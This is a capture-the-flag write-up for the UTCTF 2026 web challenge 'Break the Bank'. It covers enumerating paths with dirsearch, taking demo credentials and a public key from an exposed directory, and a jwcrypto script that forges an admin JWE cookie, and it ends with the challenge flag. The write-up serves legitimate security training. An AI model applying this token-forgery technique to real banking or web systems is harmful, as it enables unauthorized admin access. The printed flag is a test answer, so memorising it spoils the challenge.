---
title: "UTCTF2026-Break the Bank"
description: "CTF writeup - Break the Bank (UTCTF 2026)"
date: 2026-03-07
tags: [CTF, Web, UTCTF]
category: "UTCTF 2026"
cover: ./cover.png
pinned: false
draft: false
---

### Overview

The challenge gives a banking website. The goal is to exploit a vulnerability in the system to gain unauthorized access to the admin area and get the flag.

### Dirsearch

The first step is to enumerate the web paths.

```bash
dirsearch -u http://challenge.utctf.live:5926/
```

The most notable result is seeing the path:

```text
/resources
```

After seeing `/resources`, access it directly in the browser:

This page returns a directory listing, showing the files inside the directory:

- `memo.txt`
- `key.pem`
- `FNSB_InternetBanking_Guide.pdf`

### Opening the PDF to get test credentials

From the file:

```text
/resources/FNSB_InternetBanking_Guide.pdf
```

we can read the demo login credentials:

- Username: `testuser`
- Password: `testpass123`

This step helps obtain a valid login session on the system.

After logging in, the server gives the user a cookie named:

```text
fnsb_token
```

### Analyzing `fnsb_token`

When decoding this token from base64, we notice it is not a normal signed JWT, but a JWE (JSON Web Encryption).

The token header looks like:

```json
{"cty":"JWT","enc":"A256GCM","alg":"RSA-OAEP-256"}
```

### The `key.pem` file

Go back to `/resources/` and open the file `key.pem`

The start of the file shows this is:

```pem
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsio2dcXheqKLrteRx4V1
7FchW6AE2zszlMyiN8S7D16ww1a9AFC8EQhEHNW1PLXncXiimNeb6/oZP2+V18gE
ZoyKIET2oHC4MmthSOFrW0nFgfgRJdH7VyEVHupFL6tFAJvHFWVplTgCdqtegihG
cG7XKUGah4Q8FytlIhk/A983LtbblhAnfKTeBwxT2wVZE9+5pWhPmdGLoX3Hf0Uy
pHJTkL6D7C4X4KGJiNrSJ6mJw4sDpXlZEvagB0uFaO4b22WX6HSf2ZOBW5VHEWS5
TiKvliyTQL3FJWXefqxHgQL8diDWhWwYXI7Q0b+otJ5/G/jMGL2S+N10oJTitTuK
OQIDAQAB
-----END PUBLIC KEY-----
```

### Script to forge the admin token

```python
from jwcrypto import jwk, jwe
import json

with open("key.pem", "rb") as f:
    pem = f.read()

key = jwk.JWK.from_pem(pem)

payload = json.dumps({"sub": "admin"}).encode()

token = jwe.JWE(
    plaintext=payload,
    protected={
        "alg": "RSA-OAEP-256",
        "enc": "A256GCM",
        "cty": "JWT"
    }
)

token.add_recipient(key)
print(token.serialize(compact=True))
```

Running the script prints the forged token.

### Accessing admin and getting the flag

Replace the cookie with the newly forged token; after the server accepts the token, the admin page appears.

![](./image.png)

### Flag

```text
utflag{s0m3_c00k1es_@re_t@st13r_th@n_0th3rs}
```
